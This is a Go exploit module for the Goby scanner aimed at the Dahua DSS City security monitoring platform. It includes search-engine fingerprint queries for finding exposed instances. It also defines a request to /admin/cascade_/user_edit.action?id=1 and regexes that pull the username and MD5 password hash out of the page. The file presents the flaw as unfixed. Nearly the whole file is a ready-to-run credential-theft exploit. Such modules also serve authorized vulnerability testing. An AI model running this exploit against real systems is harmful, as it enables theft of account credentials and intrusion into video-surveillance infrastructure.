package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Dahua DSS City security monitoring platform /admin/cascade_/user_edit.action Information Disclosure Vulnerability",
    "Description": "<p>Dahua DSS City security monitoring platform is a system specially used for video surveillance.</p><p>Dahua DSS city security monitoring platform user_edit.action information leakage vulnerability, can obtain the account and password.</p>",
    "Product": "dahua-DSS",
    "Homepage": "https://www.dahuatech.com/",
    "DisclosureDate": "2024-06-05",
    "PostTime": "2024-06-07",
    "Author": "1070488180@qq.com",
    "FofaQuery": "body=\"/portal/include/script/dahuaDefined/headCommon.js\" || (body=\"Created by IntelliJ IDEA.\" && body=\"URL\" && body=\"refresh\")",
    "GobyQuery": "body=\"/portal/include/script/dahuaDefined/headCommon.js\" || (body=\"Created by IntelliJ IDEA.\" && body=\"URL\" && body=\"refresh\")",
    "Level": "2",
    "Impact": "<p>Dahua DSS city security monitoring platform user_edit.action information leakage vulnerability, can obtain the account and password.</p>",
    "Recommendation": "<p>The official has not fixed the vulnerability, please contact the manufacturer to fix the vulnerability:<a href=\"https://www.dahuatech.com/\">https://www.dahuatech.com/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "select",
            "type": "select",
            "value": "GetUserInfo",
            "show": "GetUserInfo"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/admin/cascade_/user_edit.action?id=1",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<legend>",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Compulsive Info",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/admin/cascade_/user_edit.action?id=1",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<legend>",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Compulsive Info",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "GetUser|lastbody|regex|value=\"(.*?)\" disabled=\"true\" type=\"text\" name=\"userBean.loginName\"",
                "GetPwdMd5|lastbody|regex|value=\"(.*?)\" type=\"password\"",
                "output|NULL|variable|Username:{{{GetUser}}}{{{CRLF}}}PasswordMd5:{{{GetPwdMd5}}}"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.8",
    "Translation": {
        "CN": {
            "Name": "大华DSS城市安防监控平台  /admin/cascade_/user_edit.action 信息泄露漏洞",
            "Product": "dahua-DSS",
            "Description": "<p>大华DSS城市安防监控平台是一个专门用于视频监控的系统。</p><p>大华DSS城市安防监控平台user_edit.action信息泄露漏洞、可获取账号和密码。<br></p>",
            "Recommendation": "<p>官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.dahuatech.com/\" target=\"_blank\">https://www.dahuatech.com/</a></p>",
            "Impact": "<p><span style=\"color: rgba(255, 255, 255, 0.87); font-size: 16px;\">大华DSS城市安防监控平台user_edit.action信息泄露漏洞、可获取账号和密码。</span><br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Dahua DSS City security monitoring platform /admin/cascade_/user_edit.action Information Disclosure Vulnerability",
            "Product": "dahua-DSS",
            "Description": "<p>Dahua DSS City security monitoring platform is a system specially used for video surveillance.</p><p>Dahua DSS city security monitoring platform user_edit.action information leakage vulnerability, can obtain the account and password.</p>",
            "Recommendation": "<p>The official has not fixed the vulnerability, please contact the manufacturer to fix the vulnerability:<a href=\"https://www.dahuatech.com/\" target=\"_blank\">https://www.dahuatech.com/</a><br></p>",
            "Impact": "<p><span style=\"color: rgba(255, 255, 255, 0.87); font-size: 16px;\">Dahua DSS city security monitoring platform user_edit.action information leakage vulnerability, can obtain the account and password.</span><br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10961"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}